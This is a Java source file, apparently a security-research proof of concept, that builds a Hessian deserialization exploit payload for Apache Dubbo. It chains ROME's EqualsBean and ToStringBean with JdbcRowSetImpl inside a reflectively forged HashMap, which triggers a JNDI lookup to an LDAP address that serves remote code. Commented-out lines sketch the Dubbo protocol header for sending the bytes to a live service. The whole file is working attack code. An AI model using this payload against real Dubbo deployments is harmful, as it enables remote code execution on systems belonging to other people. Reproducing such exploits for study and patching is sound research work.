package com.arliya.dubbo.main;

import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.dubbo.common.serialize.Cleanable;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;

public class SerializeByJdbcRowSetImpl {
    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        byte[] payload = SerializeByJdbcRowSetImpl.createPayload();
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payload);
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        hessian2Input.readObject();
    }
    public static byte[] createPayload() throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName("ldap://127.0.0.1:8888/Foo");
        rs.setMatchColumn("Foo");
        Reflections.setFieldValue(rs, "listeners",null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
        Reflections.setFieldValue(s, "table", tbl);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

//        // header.
//        byte[] header = new byte[16];
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, header);
//        // set request and serialization flag.
//        header[2] = (byte) ((byte) 0x80 | 0x20 | 2);
//
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
//        HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
//        sf.setAllowNonSerializable(true);
//        out.setSerializerFactory(sf);

        out.writeObject(s);

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

//        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
//        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();


//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
//        hessian2Input.readObject();

//        System.out.println(new String(bytes));
//        StringBuilder sb = new StringBuilder();
//        for (byte b : bytes) {
//            sb.append(String.format("%02x", b));
//        }
//        System.out.println(sb);
        return bytes;
    }
}
